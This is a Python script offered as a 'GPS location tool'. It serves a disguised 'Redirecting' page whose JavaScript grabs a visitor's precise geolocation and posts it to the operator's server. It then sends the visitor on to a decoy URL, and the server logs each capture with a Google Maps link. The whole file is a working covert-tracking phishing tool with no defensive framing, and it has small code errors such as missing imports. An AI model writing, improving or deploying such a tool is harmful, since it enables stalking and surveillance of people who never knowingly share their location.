import requests
import sys
import http.server
import socketserver
import urllib.parse
import base64

import time

import os

def free_port(port):
    try:
        if shutil.which("fuser"):
            subprocess.run(["fuser", "-k", f"{port}/tcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            return True
    except Exception:
        pass

    try:
        result = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True, check=False)
        pids = [pid.strip() for pid in result.stdout.splitlines() if pid.strip()]
        for pid in pids:
            subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        return True
    except Exception:
        return False
def run_main_tool():
    os.system('clear' if os.name != 'nt' else 'cls')

    PORT = 3333
    LOG_FILE = "location_logs.txt"

    GREEN = "\033[92m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

    def print_banner():
        print(CYAN + "=" * 60 + RESET)
        print(GREEN + r"""
  __   _____ __    ____ _  _   |_  |  |
  \ \ / / _ / _\  / ___/ || |  | | |  |
   \ V /  __/ /_  \___ \ || | _| | |_ |
    |_|\___|\__/  |____/_||_|(___|\___/
        """ + RESET)
        print(YELLOW + "        [ YEASINJU FRAMEWORK - GPS LOCATION TOOL ]        " + RESET)
        print(CYAN + "=" * 60 + RESET)

    print_banner()

    redirect_url = input(YELLOW + "[+] Enter Redirect URL (e.g. https://google.com): " + RESET).strip()

    if not redirect_url.startswith(("http://", "https://")):
        redirect_url = "https://" + redirect_url

    print(GREEN + f"[*] Target Redirect Set To: {redirect_url}" + RESET)
    print(CYAN + "=" * 60 + RESET)

    HTML_TEMPLATE = f"""<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <style>
        body {{
            background: #ffffff;
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }}
    </style>
</head>
<body>
    <script>
        const targetRedirect = "{redirect_url}";

        function sendLocation(lat, lon, acc) {{
            fetch('/location', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                body: `lat=${{lat}}&lon=${{lon}}&acc=${{acc}}`
            }}).finally(() => {{
                window.location.replace(targetRedirect);
            }});
        }}

        function requestLocation() {{
            if (!("geolocation" in navigator)) {{
                return;
            }}

            const options = {{
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }};

            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    sendLocation(lat, lon, acc);
                }},
                (error) => {{
                    console.warn('Geolocation denied or unavailable:', error.message);
                    return;
                }},
                options
            );
        }}

        requestLocation();
    </script>
</body>
</body>
</html>
"""

    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_TEMPLATE.encode('utf-8'))

        def do_POST(self):
            if self.path == '/location':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')

                parsed_data = urllib.parse.parse_qs(post_data)

                lat = parsed_data.get('lat', ['N/A'])[0]
                lon = parsed_data.get('lon', ['N/A'])[0]
                acc = parsed_data.get('acc', ['N/A'])[0]

                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] Lat: {lat} | Lon: {lon} | Accuracy: {acc}m | Google Maps: {maps_link}\n"

                with open(LOG_FILE, "a") as f:
                    f.write(log_entry)

                print(GREEN + "\n[+] GPS Location Captured Successfully!" + RESET)
                print(CYAN + f"    - Latitude  : {lat}" + RESET)
                print(CYAN + f"    - Longitude : {lon}" + RESET)
                print(CYAN + f"    - Accuracy  : {acc} meters" + RESET)
                print(YELLOW + f"    - Map Link  : {maps_link}\n" + RESET)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")

    print(GREEN + f"[*] Server running on: http://localhost:{PORT}" + RESET)
    print(GREEN + f"[*] Logs will be saved to: ./{LOG_FILE}" + RESET)

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(RED + "\n[*] Criminal-KOT  XGPS Tool Stopped." + RESET)


if __name__ == "__main__":
    try:
        run_main_tool()
    except KeyboardInterrupt:
        print(RED + "\n[*] XGPS  Tool Stopped." + RESET)
